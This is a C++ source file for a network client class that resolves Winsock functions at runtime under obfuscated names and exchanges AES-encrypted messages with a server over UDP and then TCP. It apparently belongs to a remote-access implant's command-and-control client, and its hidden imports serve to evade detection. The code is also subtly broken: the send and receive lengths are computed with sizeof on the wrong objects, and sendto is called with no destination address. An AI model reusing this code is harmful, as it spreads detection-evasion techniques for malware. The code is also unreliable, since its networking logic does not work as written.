#include "../Headers/client.h"
#include "../Headers/obfuscate.h"
#include "../Headers/procutils.h"
#include "../Headers/aes.hpp"

//#include <openssl/evp.h>
//#include <openssl/aes.h>

#define winsock32 std::string(HIDE("Ws2_32.dll"))

Client::Client() {
	LoadWSAFunctions();
	OutputDebugStringA("Loaded WSA Functions");

	WORD version = MAKEWORD(2, 2);
	WSAData data = { 0 };
	int success  = StartWSA(version, &data);

	if ( success == 0 )
		WSAInitialized = TRUE;
}

Client::~Client() {
	this->Disconnect(); // disconnect incase the socket is still connected

	CleanWSA();
	ProcessUtilities::FreeUsedLibrary(winsock32);
}
// TODO: CHANGE ADDR TO SERVER DNS

VOID Client::LoadWSAFunctions() {
	if ( WSAInitialized )
		return;

	HMODULE kernel32 = ProcessUtilities::GetModHandle(ProcessUtilities::freqDLLS::kernel32); // load winsock
	ProcessUtilities::PPROCFN::_LoadLibrary load = ProcessUtilities::GetFunctionAddress<ProcessUtilities::PPROCFN::_LoadLibrary>(kernel32, std::string(HIDE("LoadLibraryA")));
	
	HMODULE WINSOCK = load(winsock32.c_str());

	// function pointers from winsock
	StartWSA	  = ProcessUtilities::GetFunctionAddress<_WSAStartup>(WINSOCK, std::string(HIDE("WSAStartup")));
	BindSocket    = ProcessUtilities::GetFunctionAddress<_bind>(WINSOCK, std::string(HIDE("bind")));
	CloseSocket   = ProcessUtilities::GetFunctionAddress<_closesocket>(WINSOCK, std::string(HIDE("closesocket")));
	CreateSocket  = ProcessUtilities::GetFunctionAddress<_socket>(WINSOCK, std::string(HIDE("socket")));
	Receive       = ProcessUtilities::GetFunctionAddress<_recv>(WINSOCK, std::string(HIDE("recv")));
	SendTo        = ProcessUtilities::GetFunctionAddress<_sendto>(WINSOCK, std::string(HIDE("sendto")));
	ReceiveFrom   = ProcessUtilities::GetFunctionAddress<_recvfrom>(WINSOCK, std::string(HIDE("recvfrom")));
	Send          = ProcessUtilities::GetFunctionAddress<_send>(WINSOCK, std::string(HIDE("send")));
	CleanWSA      = ProcessUtilities::GetFunctionAddress<_WSACleanup>(WINSOCK, std::string(HIDE("WSACleanup")));
	ConnectSocket = ProcessUtilities::GetFunctionAddress<_connect>(WINSOCK, std::string(HIDE("connect")));
}

BOOL Client::Connect() {

	// make request to udp server
	this->UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if ( this->UDPSocket == INVALID_SOCKET )
		return FALSE;

	ClientRequest request = {};
	request.action = ClientRequest::Action::CONNECT_CLIENT;
	request.client = reinterpret_cast< void* >( this );

	BOOL validServerResponse = UDPSendMessageToServer(request);
	if ( !validServerResponse )
		return FALSE;  

	// connect to tcp server
	this->TCPSocket = CreateSocket(AF_INET, SOCK_STREAM, 0);
	if ( this->TCPSocket == INVALID_SOCKET )
		return FALSE;

	int connect = ConnectSocket(this->TCPSocket, ( sockaddr* ) &this->ConnectedServer.addr, sizeof(this->ConnectedServer.addr));
	if ( connect == SOCKET_ERROR )
		return FALSE;

	// set everything now that we are connected to tcp server
	CloseSocket(this->UDPSocket); // no longer needed
	this->UDPSocket = INVALID_SOCKET;

	return TRUE;
}

BOOL Client::SocketReady(SocketTypes type) const {
	BOOL socketReady = FALSE;

	switch ( type ) {
	case UDP:
		socketReady = this->UDPSocket != INVALID_SOCKET;
		break;
	case TCP:
		socketReady = this->TCPSocket != INVALID_SOCKET;
		break;
	}

	return socketReady == TRUE && WSAInitialized;
}

BYTESTRING Client::EncryptClientRequest(ClientRequest req) const {
	NET_BLOB blob;
	blob.aesKey = this->EncryptionKey;
	blob.cr = req;

	BYTESTRING buff = NetCommon::AESEncryptBlob(blob);

	return buff;
}

ServerRequest Client::DecryptServerRequest(BYTESTRING req) {
	return DecryptInternetData<ServerRequest>(req);
}

BOOL Client::UDPSendMessageToServer(ClientMessage message) {
	if ( !SocketReady(UDP) )
		return FALSE;

	BYTESTRING encrypted = EncryptClientRequest(message);

	int sent = SendTo(this->UDPSocket, reinterpret_cast<char*>(encrypted.data()), sizeof(encrypted.size()), 0, NULL, NULL);
	if ( sent == SOCKET_ERROR )
		return FALSE;

	/*
		Set up a UDPResponse buffer to receive information
		from the server and interpret it as a struct
	*/
	BYTESTRING udpResponseBuffer;
	udpResponseBuffer.resize(1000);
	int received = ReceiveFrom(this->UDPSocket, reinterpret_cast<char*>(udpResponseBuffer.data()), sizeof(udpResponseBuffer), 0, NULL, NULL);
	if ( received == SOCKET_ERROR )
		return FALSE;

	// decrypt the udp response and cast it to UDPResponse
	UDPResponse response = DecryptInternetData<UDPResponse>(udpResponseBuffer);

	// update connected server after receiving a udp response from the server
	if (response.isValid) this->ConnectedServer = response.TCPServer;

	return response.isValid;
}

BOOL Client::TCPSendMessageToServer(ClientMessage message) {
	if ( !SocketReady(TCP) )
		return FALSE;

	BYTESTRING encryptedRequest = EncryptClientRequest(message);

	int sent = Send(this->TCPSocket, reinterpret_cast< char* >( encryptedRequest.data() ), encryptedRequest.size(), 0);
	if ( sent == SOCKET_ERROR )
		return FALSE;

	return TRUE;
}

BOOL Client::MakeServerRequest(ClientRequest request, BOOL udp) {
	return udp ? UDPSendMessageToServer(request) : TCPSendMessageToServer(request);
}

BOOL Client::Disconnect() {
	if ( !SocketReady(TCP) )
		return FALSE;

	int status = CloseSocket(this->TCPSocket);
	if ( status == SOCKET_ERROR ) {
		return FALSE;
	}

	return TRUE;
}